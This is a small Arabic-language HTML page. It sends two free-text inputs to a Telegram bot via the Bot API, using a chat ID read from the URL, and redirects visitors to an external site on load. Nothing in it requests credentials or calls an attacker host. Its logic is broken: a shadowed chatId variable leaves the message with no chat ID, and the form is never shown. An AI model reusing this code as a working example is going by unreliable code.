<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>📩 إرسال بيانات</title>
  <style>
    body { font-family: Arial; text-align: center; padding-top: 50px; background: #f9f9f9; }
    input { padding: 10px; margin: 10px; width: 200px; }
    button { padding: 10px 30px; }
  </style>
</head>
<body>
  <h2 id="status">⏳ جاري تجهيز الصفحة ...</h2>

  <div id="form" style="display: none;">
    <input type="text" id="input1" placeholder="اكتب النص الأول">
    <br>
    <input type="text" id="input2" placeholder="اكتب النص الثاني">
    <br>
    <button onclick="sendToBot()">✅ إرسال للبوت</button>
  </div>

  <script>
    let chatId;
    
    window.onload = function() {
      const params = new URLSearchParams(window.location.search);
      const chatId = params.get('chatId');

      if (chatId) {
        // 🟢 هنا رابط موقعك انت اللي هتوديه ليه
        const targetURL = `https://Medo.Broblems.com/mysite/index.html?id=${chatId}`;
        window.location.href = targetURL;
      } else {
        document.body.innerHTML = "<h2>❌ مفيش chatId في الرابط</h2>";
      }
    };

    function sendToBot() {
      const val1 = document.getElementById('input1').value;
      const val2 = document.getElementById('input2').value;

      const text = `📥 بيانات جديدة من الموقع:
🔹 النص الأول: ${val1}
🔹 النص الثاني: ${val2}`;

      const botToken = 'YOUR_BOT_TOKEN'; // ✏️ حط توكن البوت بتاعك هنا

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      const data = {
        chat_id: chatId, // 🟢 هي دي الفكرة: البوت يبعت لنفس الـ ID اللي جاي من الرابط
        text: text
      };

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(data => {
        alert("✅ تم إرسال البيانات بنجاح!");
      })
      .catch(error => {
        console.error('Error:', error);
        alert("❌ حصل خطأ أثناء الإرسال");
      });
    }
  </script>
</body>
</html>
